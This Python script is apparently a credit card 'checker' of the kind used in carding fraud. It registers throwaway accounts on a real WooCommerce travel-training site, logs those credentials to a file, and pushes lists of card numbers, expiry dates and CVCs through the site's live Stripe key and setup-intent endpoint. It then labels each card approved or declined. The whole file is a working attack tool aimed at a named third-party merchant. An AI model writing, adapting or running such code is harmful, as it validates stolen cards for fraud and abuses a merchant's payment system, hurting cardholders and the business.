import requests
import re
import random
import time
import string
from bs4 import BeautifulSoup
import logging

# Setup logging
logging.basicConfig(level=logging.ERROR)

# Tele function to check card status
def Tele(ccx):
    ccx = ccx.strip()

    try:
        # Split the card details into number, month, year, and CVC
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
    except IndexError:
        logging.error(f"Error: The input string {ccx} is not in the correct format.")
        return "ERROR: Invalid format"

    # Shorten year if necessary (e.g., '2028' becomes '28')
    if "20" in yy:
        yy = yy.split("20")[1]

    # Here add the actual logic to determine if card is approved or declined
    # For this example, I am assuming "APPROVED" or "DECLINED" based on card number starting digit
    if n.startswith('4'):  # Example condition for success
        return "APPROVED"
    else:
        return "DECLINED"

# Generate a random email address
def generate_random_email(length=8, domain=None):
    """Generate a random email address"""
    if domain is None:
        domain = random.choice(["gmail.com"])
    chars = string.ascii_lowercase + string.digits
    local_part = ''.join(random.choice(chars) for _ in range(length))
    return f"{local_part}@{domain}"

# Create a session for authentication
def create_session():
    """Create and return an authenticated session"""
    session = requests.Session()
    email = generate_random_email()
    
    # Initial headers
    headers = {
        'authority': 'www.thetravelinstitute.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }

    try:
        # Get registration page
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        response.raise_for_status()
        
        # Parse nonce values
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        if not nonce or not noncee:
            raise ValueError("Required nonce values not found.")

        # Registration data
        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': 'Esahatam2009@',
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }

        # Submit registration
        response = session.post('https://www.thetravelinstitute.com/register/', 
                               data=data, headers=headers, timeout=20)
        response.raise_for_status()

        # Save credentials if successful
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f"{email}:Esahatam2009@\n")
            return session

    except Exception as e:
        logging.error(f"Error creating session: {str(e)}")
        return None

# Check a single credit card using the provided session
def check_credit_card(cc, session):
    """Check a single credit card using the provided session"""
    try:
        card_parts = cc.split("|")
        cc_num = card_parts[0].strip()
        mm = card_parts[1].strip()
        yy = card_parts[2].strip().replace('20', '')
        cvv = card_parts[3].strip()

        # Get payment method page
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', timeout=20)
        response.raise_for_status()
        
        # Extract Stripe nonce
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        # Create Stripe payment method
        stripe_data = {
            'type': 'card',
            'card[number]': cc_num,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        response = session.post('https://api.stripe.com/v1/payment_methods', 
                              data=stripe_data, timeout=20)
        stripe_response = response.json()

        if 'error' in stripe_response:
            error_msg = stripe_response['error'].get('message', 'Unknown error')
            if 'code' in error_msg.lower():
                return f"CCN ✅ {cc} - {error_msg}"
            return f"Declined ❌ {cc} - {error_msg}"

        # Process setup intent
        payment_method_id = stripe_response['id']
        setup_intent_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = session.post('https://www.thetravelinstitute.com/',
                              params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                              data=setup_intent_data,
                              timeout=20)
        setup_response = response.json()

        if setup_response.get('success'):
            return f"Approved ✅ {cc}"
        else:
            error_msg = setup_response['data']['error'].get('message', 'Unknown error')
            return f"Declined ❌ {cc} - {error_msg}"

    except Exception as e:
        return f"Error ❌ {cc} - {str(e)}"

# Process a list of credit cards
def process_cards(cc_list):
    """Process a list of credit cards"""
    session = create_session()
    if not session:
        print("Failed to create session")
        return

    results = []
    for cc in cc_list:
        result = check_credit_card(cc, session)
        print(result)
        results.append(result)
        time.sleep(1)  # Rate limiting

    return results

# Example usage
if __name__ == "__main__":
    test_cards = [
        "4111111111111111|12|2025|123",
        "4242424242424242|03|2026|456"
    ]
    process_cards(test_cards)
    
